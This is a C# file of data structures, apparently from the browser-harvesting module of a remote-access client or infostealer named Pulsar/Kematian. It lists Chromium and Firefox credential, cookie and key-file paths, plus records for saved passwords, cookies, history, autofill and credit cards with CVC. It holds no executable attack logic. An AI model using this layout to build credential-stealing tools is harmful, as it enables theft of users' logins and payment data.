﻿namespace Pulsar.Client.Kematian.Browsers.Helpers.Structs
{
    public struct AllBrowsers
    {
        public BrowserChromium[] Chromium;
        public BrowserGecko[] Gecko;
    }

    public struct BrowserChromium
    {
        public string Name;
        public string LocalState;
        public string Path;
        public ProfileChromium[] Profiles;
    }

    public struct ProfileChromium
    {
        public string Name;
        public string Path;
        public string LoginData;
        public string WebData;
        public string Cookies;
        public string History;
        public string Bookmarks;
    }

    public struct BrowserGecko
    {
        public string Name;
        public string Path;
        public string Key4;
        public string Logins;
        public string Cookies;
        public string History;
        public string ProfilesDir;
    }


    public struct AutoFillData
    {
        public string Name;
        public string Value;
        public string Value_lower;
        public string Date_created;
        public string Date_last_used;
        public string Count;

        public AutoFillData(string name, string value, string valueLower, string dateCreated, string dateLastUsed, string count)
        {
            Name = name;
            Value = value;
            Value_lower = valueLower;
            Date_created = dateCreated;
            Date_last_used = dateLastUsed;
            Count = count;
        }
    }

    public struct CookieData
    {
        public string HostKey;
        public string Path;
        public string ExpiresUTC;
        public string Name;
        public string Value;

        public CookieData(string host_key, string path, string expires_utc, string name, string value)
        {
            HostKey = host_key;
            Path = path;
            ExpiresUTC = expires_utc;
            Name = name;
            Value = value;
        }
    }

    public struct HistoryData
    {
        public string Url;
        public string Title;
        public string VisitCount;
        public string LastVisitTime;

        public HistoryData(string url, string title, string visitCount, string lastVisitTime)
        {
            Url = url;
            Title = title;
            VisitCount = visitCount;
            LastVisitTime = lastVisitTime;
        }
    }

    public struct DownloadChromium
    {
        public string Current_path;
        public string Target_path;
        public string Start_time;
        public string Received_bytes;
        public string Total_bytes;
        public string Danger_type;
        public string End_time;
        public string Opened;
        public string Last_access_time;
        public string Referrer;
        public string Tab_url;
        public string Tab_referrer_url;
        public string Mime_type;
        public string Original_mime_type;

        public DownloadChromium(string currentPath, string targetPath, string startTime, string receivedBytes, string totalBytes, string dangerType, string endTime, string opened, string lastAccessTime, string referrer, string tabUrl, string tabReferrerUrl, string mimeType, string originalMimeType)
        {
            Current_path = currentPath;
            Target_path = targetPath;
            Start_time = startTime;
            Received_bytes = receivedBytes;
            Total_bytes = totalBytes;
            Danger_type = dangerType;
            End_time = endTime;
            Opened = opened;
            Last_access_time = lastAccessTime;
            Referrer = referrer;
            Tab_url = tabUrl;
            Tab_referrer_url = tabReferrerUrl;
            Mime_type = mimeType;
            Original_mime_type = originalMimeType;
        }
    }

    public struct LoginData
    {
        public string Url;
        public string Username;
        public string Password;

        public LoginData(string url, string username, string password)
        {
            Url = url;
            Username = username;
            Password = password;
        }
    }

    public struct BookmarkData
    {
        public string Url;
        public string Title;

        public BookmarkData(string url, string title)
        {
            Url = url;
            Title = title;
        }
    }

    public struct CreditCardData
    {
        public string Name;
        public string Number;
        public string Expiry;
        public string Cvc;

        public CreditCardData(string name, string number, string expiry, string cvc)
        {
            Name = name;
            Number = number;
            Expiry = expiry;
            Cvc = cvc;
        }
    }
}
